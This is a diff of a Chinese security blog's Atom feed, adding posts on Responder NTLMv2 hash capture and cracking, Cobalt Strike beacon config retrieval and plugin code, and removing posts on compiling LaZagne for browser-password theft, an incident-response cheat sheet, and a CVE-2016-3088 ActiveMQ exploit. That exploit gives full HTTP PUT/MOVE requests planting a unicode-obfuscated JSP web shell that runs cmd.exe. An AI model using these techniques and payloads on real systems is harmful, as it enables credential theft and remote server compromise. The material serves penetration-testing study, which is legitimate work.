@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-11-15T06:29:46.333Z</updated>
+  <updated>2020-12-14T08:38:36.719Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,79 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Responder在渗透测试中的利用</title>
+    <link href="http://sherlocz.github.io/2020/12/14/Responder-Pentest/"/>
+    <id>http://sherlocz.github.io/2020/12/14/Responder-Pentest/</id>
+    <published>2020-12-14T04:42:47.000Z</published>
+    <updated>2020-12-14T08:38:36.719Z</updated>
+    
+    <content type="html"><![CDATA[<p>#基本使用#</p><p>Github:<br><a href="https://github.com/lgandx/Responder-Windows" target="_blank" rel="noopener">https://github.com/lgandx/Responder-Windows</a><br>Kali自带<br>启用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0</span><br></pre></td></tr></table></figure></p><p><img src="/2020/12/14/Responder-Pentest/start.png" alt><br>这里监听了这台kali，ip为192.168.43.105</p><p>使用域内其他机器访问kali的ipc，由于不存在，DNS解析不成功，回退到LLMNR和NBT-NS请求来解析目的地机器，这个时候responder会抓取到NTLMv2的hash</p><p><img src="/2020/12/14/Responder-Pentest/ipc.png" alt></p><p><img src="/2020/12/14/Responder-Pentest/hash.png" alt></p><p>抓取到的hash用<a href="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" title="https://github.com/hashcat/hashcat/releases/tag/v6.1.1" target="_blank" rel="noopener">hashcat</a>解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/hashcat-6.1.1# ./hashcat.bin -m 5600 hash.txt pass.txt</span><br></pre></td></tr></table></figure><p>解出hash之后就可以用域用户登录了。<br><img src="/2020/12/14/Responder-Pentest/pass.png" alt></p><p>#钓鱼#<br>在Responder的配置文件中，我们可以找到html inject的相关信息<br><img src="/2020/12/14/Responder-Pentest/html.png" alt></p><p>将这个img标签新建到html中，访问<br><img src="/2020/12/14/Responder-Pentest/ip.png" alt></p><p>这里随意输入，然后点击确定，responder会接收到ntlm v2的hash<br><img src="/2020/12/14/Responder-Pentest/admin.png" alt></p><p>这里的hash并不是我们弹框输入的用户名密码的hash，而是对方机器的真实hash</p><p>#NTLMv2传递#<br>Waiting……</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;#基本使用#&lt;/p&gt;
+&lt;p&gt;Github:&lt;br&gt;&lt;a href=&quot;https://github.com/lgandx/Responder-Windows&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/lgandx/R
+      
+    
+    </summary>
+    
+    
+    
+      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>读取CS的beacon配置文件</title>
+    <link href="http://sherlocz.github.io/2020/12/03/cs-checksum8/"/>
+    <id>http://sherlocz.github.io/2020/12/03/cs-checksum8/</id>
+    <published>2020-12-03T09:42:37.000Z</published>
+    <updated>2020-12-03T10:52:14.266Z</updated>
+    
+    <content type="html"><![CDATA[<p>nmap脚本在这里：<br><a href="https://github.com/whickey-r7/grab_beacon_config" target="_blank" rel="noopener">https://github.com/whickey-r7/grab_beacon_config</a></p><p>我们可以看见这个url后面拼接的加密方式、感觉就是返回了4位数的随机数<br><img src="/2020/12/03/cs-checksum8/nse.png" alt></p><p>写成python脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">def generate_checksum(input):</span><br><span class="line">trial = &quot;&quot;</span><br><span class="line">total = 0</span><br><span class="line">i = 1</span><br><span class="line">while total != input:</span><br><span class="line">total = 0</span><br><span class="line">trial = &apos;&apos;.join(random.choice(&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;) for i in range(4))</span><br><span class="line">for i in range(4):</span><br><span class="line">total = (total + ord(trial[i])) % 256</span><br><span class="line">i = i + 1</span><br><span class="line">return trial</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">url_x86 = generate_checksum(92)</span><br><span class="line">print(url_x86)</span><br><span class="line">url_x64 = generate_checksum(93)</span><br><span class="line">print(url_x64)</span><br></pre></td></tr></table></figure></p><p>生成四位数的随机数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.75.170/KeVV</span><br></pre></td></tr></table></figure></p><p>可以下载下来beacon的配置文件，打开是二进制文件、网上找了几个cobaltstrikescan的脚本解析但是都没成功 ==</p><p>nmap脚本效果如下：<br><img src="/2020/12/03/cs-checksum8/nse.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;nmap脚本在这里：&lt;br&gt;&lt;a href=&quot;https://github.com/whickey-r7/grab_beacon_config&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/whickey-r7/gra
+      
+    
+    </summary>
+    
+    
+    
+      <category term="CobaltStrike" scheme="http://sherlocz.github.io/tags/CobaltStrike/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CS插件开发</title>
+    <link href="http://sherlocz.github.io/2020/11/21/cna-code/"/>
+    <id>http://sherlocz.github.io/2020/11/21/cna-code/</id>
+    <published>2020-11-21T11:23:09.000Z</published>
+    <updated>2020-11-29T12:13:16.625Z</updated>
+    
+    <content type="html"><![CDATA[<p>新建按钮：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_bottom &#123;</span><br><span class="line">menu &quot;测试&quot; &#123;</span><br><span class="line">item &quot;测试1&quot; &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/11/21/cna-code/button.png" alt></p><p>控制台文本颜色：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alias showcolor&#123;</span><br><span class="line">blog($1,&quot;Hello \c0test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c1test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c2test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c3test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c4test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c5test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c6test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c7test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c8test&quot;);</span><br><span class="line">blog($1,&quot;Hello \c9test&quot;);</span><br><span class="line">blog($1,&quot;Hello \cAtest&quot;);</span><br><span class="line">blog($1,&quot;Hello \cBtest&quot;);</span><br><span class="line">blog($1,&quot;Hello \cCtest&quot;);</span><br><span class="line">blog($1,&quot;Hello \cDtest&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/11/21/cna-code/color.png" alt></p><p>上传文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">popup beacon_bottom &#123;</span><br><span class="line">menu &quot;测试&quot; &#123;</span><br><span class="line">item &quot;上传nbtscan&quot; &#123;</span><br><span class="line">$bid = $1;</span><br><span class="line">$dialog = dialog(&quot;上传nbtscan&quot;, %(UploadPath =&gt; &quot;C:\\Temp\\&quot;, bid =&gt; $bid), &amp;FRP);</span><br><span class="line">drow_text($dialog, &quot;UploadPath&quot;,  &quot;上传路径: &quot;); </span><br><span class="line">dbutton_action($dialog, &quot;上传&quot;);</span><br><span class="line">dialog_show($dialog);</span><br><span class="line">        &#125;</span><br><span class="line">        sub FRP &#123;</span><br><span class="line">    bcd($bid, $3[&apos;UploadPath&apos;]);</span><br><span class="line">    if (-is64 $bid[&apos;id&apos;]) &#123;</span><br><span class="line">        bupload($bid, script_resource(&quot;/japowriehfpao.exe&quot;));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        bupload($bid, script_resource(&quot;/japowriehfpao.exe&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/5887" title="https://xz.aliyun.com/t/5887" target="_blank" rel="noopener">CobaltStrike插件开发官方指南 Part1</a></p><p><a href="https://www.cobaltstrike.com/aggressor-script/functions.html" title="https://www.cobaltstrike.com/aggressor-script/functions.html" target="_blank" rel="noopener">Aggressor Script Tutorial and Reference</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;新建按钮：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br
+      
+    
+    </summary>
+    
+    
+    
+      <category term="CS插件" scheme="http://sherlocz.github.io/tags/CS%E6%8F%92%E4%BB%B6/"/>
+    
+  </entry>
   
   <entry>
     <title>lazagne-360</title>
@@ -431,84 +504,6 @@
     
     
       <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>LaZagne编译抓取浏览器密码</title>
-    <link href="http://sherlocz.github.io/2020/05/12/LaZagne%E7%BC%96%E8%AF%91%E6%8A%93%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81/"/>
-    <id>http://sherlocz.github.io/2020/05/12/LaZagne编译抓取浏览器密码/</id>
-    <published>2020-05-12T11:33:08.000Z</published>
-    <updated>2020-05-12T11:50:01.140Z</updated>
-    
-    <content type="html"><![CDATA[<p>其实编译的方法挺简单的，主要是想记录一下，LaZagne编译之后第一次使用是免杀的，原理不清楚，先记录一下</p><ul><li>下载地址：<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></li><li>编译文档：<a href="https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile</a></li><li>编译好的exe下载：<a href="https://github.com/AlessandroZ/LaZagne/releases" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/releases</a></li></ul><h1 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h1><p>首先将LaZagne源码下载下来，然后安装我们需要的python第三方库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/install.jpg" alt></p><p>安装pyinstaller：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/pyinstaller.jpg" alt></p><p>利用pyinstaller编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller --onefile -w lazagne.spec</span><br></pre></td></tr></table></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/success.jpg" alt></p><p>编译成功之后会在dist文件中生成LaZagne.exe</p><p>抓取浏览器密码<br><img src="/2020/05/12/LaZagne编译抓取浏览器密码/browsers.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;其实编译的方法挺简单的，主要是想记录一下，LaZagne编译之后第一次使用是免杀的，原理不清楚，先记录一下&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;下载地址：&lt;a href=&quot;https://github.com/AlessandroZ/LaZagne&quot; target=&quot;_blank&quot; 
-      
-    
-    </summary>
-    
-    
-    
-      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Apache ActiveMQ 远程代码执行漏洞复现</title>
-    <link href="http://sherlocz.github.io/2020/04/18/Apache-ActiveMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://sherlocz.github.io/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/</id>
-    <published>2020-04-18T06:01:53.000Z</published>
-    <updated>2020-04-18T06:38:56.388Z</updated>
-    
-    <content type="html"><![CDATA[<ul><li>漏洞编号：CVE-2016-3088</li><li>利用条件：需要登录在admin或者api中，默认密码为admin<br><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/1.png" alt></li></ul><p>首先获取当前路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/home.png" alt></p><p>然后使用PUT方式写入文件到fileserver这个路径下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/123123.txt HTTP/1.1</span><br><span class="line">Host: xxxxx:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=18wh2ode441ry1g7stwirxxm0v</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 3052</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">\u0069\u0066\u0020\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0022\u0043\u006f\u006d\u006d\u0061\u006e\u0064\u003a\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u002b\u0020\u0022\u005c\u006e\u003c\u0042\u0052\u003e\u0022\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0020\u0070\u0020\u003d\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0020\u002f\u0063\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u006f\u0073\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0064\u0069\u0073\u0020\u003d\u0020\u006e\u0065\u0077\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0069\u006e\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0028\u0020\u0064\u0069\u0073\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0064\u0069\u0073\u0072\u0029\u003b\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/content.png" alt></p><p>由于在fileserver这个路径下无法解析，我们接下来要使用MOVE方式移动到web能解析的目录下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/123123.txt HTTP/1.1</span><br><span class="line">Destination: file:///C:/apache-activemq-5.4.3/webapps/admin/sys1.jsp</span><br><span class="line">Host: xxx:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1pyt7l1je0zt0oka428srh0r6</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/success.png" alt><br>注意有三个回车在最后鸭</p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/admin.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;ul&gt;
-&lt;li&gt;漏洞编号：CVE-2016-3088&lt;/li&gt;
-&lt;li&gt;利用条件：需要登录在admin或者api中，默认密码为admin&lt;br&gt;&lt;img src=&quot;/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/1.png&quot; alt&gt;&lt;/li&gt;
-&lt;
-      
-    
-    </summary>
-    
-    
-    
-      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>应急响应基础知识和命令</title>
-    <link href="http://sherlocz.github.io/2020/03/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E5%91%BD%E4%BB%A4/"/>
-    <id>http://sherlocz.github.io/2020/03/24/应急响应基础知识和命令/</id>
-    <published>2020-03-24T09:42:22.000Z</published>
-    <updated>2020-03-26T06:32:49.989Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近在开始学习应急响应的相关知识，接触到了很多，比方说白加黑啊、几个APT组织啊，流量分析、天眼分析等等，其实还没有实际接触过应急响应，这里就先做个最基础的笔记，等会让我想想整体的框架是啥。</p><p>好了知道怎么写了，大概就这么写吧，这里不详细记录应急的过程，记录下一些基础的命令、工具和词汇。</p><p>应急一般会有：勒索病毒、挖矿木马、DDoS、APT攻击等。</p><p>不过主要的还是勒索和挖矿两种。</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>文件分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#查看tmp目录下的文件</span><br><span class="line">ls –alt /tmp/</span><br><span class="line"></span><br><span class="line">#查看开机启动项</span><br><span class="line">ls -alt /etc/init.d/</span><br><span class="line"></span><br><span class="line">#按时间排序查看指定目录下的文件</span><br><span class="line">ls -alt | head -n 10</span><br><span class="line"></span><br><span class="line">#查看文件创建修改时间信息</span><br><span class="line">stat</span><br><span class="line"></span><br><span class="line">#查看历史命令记录文件</span><br><span class="line">cat /root/.bash_history | more</span><br><span class="line"></span><br><span class="line">#查看操作系统用户信息文件/etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">#查找24小时内被修改的php文件</span><br><span class="line">find ./ -mtime 0 -name &quot;*.php&quot;</span><br><span class="line"></span><br><span class="line">#查找72小时内新增的文件</span><br><span class="line">find / -ctime 2</span><br><span class="line"></span><br><span class="line">#查找777的权限的jsp文件</span><br><span class="line">find / *.jpg -perm 4777</span><br><span class="line"></span><br><span class="line">#查看当前的任务计划有哪些</span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line">#查看etc目录任务计划相关文件</span><br><span class="line">ls /etc/cron*</span><br></pre></td></tr></table></figure></p><p>进程分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看本机网络连接情况</span><br><span class="line">netstat -antlp | more</span><br><span class="line"></span><br><span class="line">#根据netstat定位出pid，使用ps命令分析进程</span><br><span class="line">ps aux | grep pid | grep -v grep</span><br></pre></td></tr></table></figure></p><p>日志分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看系统中所有用户最近一次登陆信息</span><br><span class="line">lastlog</span><br><span class="line"></span><br><span class="line">#显示用户错误的登陆列表</span><br><span class="line">lastb</span><br><span class="line"></span><br><span class="line">#显示用户最近登陆信息（数据源为/var/log/wtmp、/var/log/btmp）</span><br><span class="line">last</span><br></pre></td></tr></table></figure></p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>【开始】-&gt;【运行】<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msconfig//查看开机启动项</span><br><span class="line">%UserProfile%\Recent//Recent最近打开的文件夹</span><br><span class="line">compmgmt.msc//计算机管理</span><br><span class="line">eventvwr//事件管理器</span><br></pre></td></tr></table></figure></p><p>CMD命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#查看当前网络连接</span><br><span class="line">netstat -aon</span><br><span class="line">netstat -aon | findstr ESTABLISHED</span><br><span class="line"></span><br><span class="line">#根据netstat定位pid，根据pid定位进程</span><br><span class="line">tasklist | findstr 1228</span><br><span class="line"></span><br><span class="line">#根据wmic process获取进程的全部路径</span><br><span class="line">wmic process | findstr &quot;xxxx.exe&quot;</span><br><span class="line"></span><br><span class="line">#查看用户信息</span><br><span class="line">net user username</span><br><span class="line"></span><br><span class="line">#查看当前系统用户对话</span><br><span class="line">query user</span><br><span class="line"></span><br><span class="line">#踢出用户</span><br><span class="line">logoff</span><br><span class="line"></span><br><span class="line">#查看系统版本及补丁信息</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p><p>系统信息排查：<br>1、查看环境变量<br>2、查看Windows计划<br>3、查看账号信息，如隐藏用户等；</p><p>排查工具：<br>1、PC Hunter<br>2、ProcessExplorer<br>3、Microsoft Network Monitor</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;最近在开始学习应急响应的相关知识，接触到了很多，比方说白加黑啊、几个APT组织啊，流量分析、天眼分析等等，其实还没有实际接触过应急响应，这里就先做个最基础的笔记，等会让我想想整体的框架是啥。&lt;/p&gt;
-&lt;p&gt;好了知道怎么写了，大概就这么写吧，这里不详细记录应急的过程，记录下一
-      
-    
-    </summary>
-    
-    
-    
-      <category term="应急响应" scheme="http://sherlocz.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
     
   </entry>
   
